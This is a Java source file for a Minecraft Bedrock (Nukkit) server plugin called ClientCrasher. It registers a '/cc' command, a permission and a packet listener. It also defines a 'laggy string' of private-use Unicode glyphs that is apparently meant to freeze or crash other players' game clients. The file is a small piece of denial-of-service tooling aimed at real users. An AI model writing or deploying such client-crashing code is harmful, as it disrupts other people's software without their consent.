package me.liuli.cc;

import cn.nukkit.permission.Permission;
import cn.nukkit.plugin.PluginBase;

public class ClientCrasher extends PluginBase {
    public static ClientCrasher instance;

    @Override
    public void onEnable() {
        instance = this;

        //register perm
        this.getServer().getPluginManager().addPermission(new Permission("liuli.clientcrasher.command", "Use /cc command", Permission.DEFAULT_PERMISSION));
        //register command
        this.getServer().getCommandMap().register("cc", new CommandListener("cc"));
        //register listener
        this.getServer().getPluginManager().registerEvents(new PacketBlockManager(), this);
    }

    public static String getLaggyString(){
        return "\uE001\uE002\uE003\uE004\uE005\uE006\uE007\uE008\uE009\uE00A\uE00B\uE00C\uE00D\uE00E\uE00F\uE020\uE021\uE022\uE023\uE024\uE025\uE026\uE027\uE028\uE029\uE02A\uE02B\uE02C\uE02D\uE02E\uE02F\uE040\uE041\uE042\uE043\uE044\uE045\uE046\uE047\uE048\uE049\uE04A\uE04B\uE04C\uE04D\uE04E\uE04F\uE060\uE061\uE062\uE080\uE081\uE082\uE083\uE084\uE085\uE086\uE087\uE0A0\uE0A1\uE0C0\uE0C1\uE0C2\uE0C3\uE0C4\uE0C5\uE0C6\uE0C7\uE0C8\uE0C9\uE0CA\uE0CB\uE0CC\uE0CD\uE0E0\uE0E1\uE0E2\uE0E3\uE0E4\uE0E5\uE0E6\uE0E7\uE0E8\uE0E9\uE0EA\uE100\uE101\uE102";
    }
}
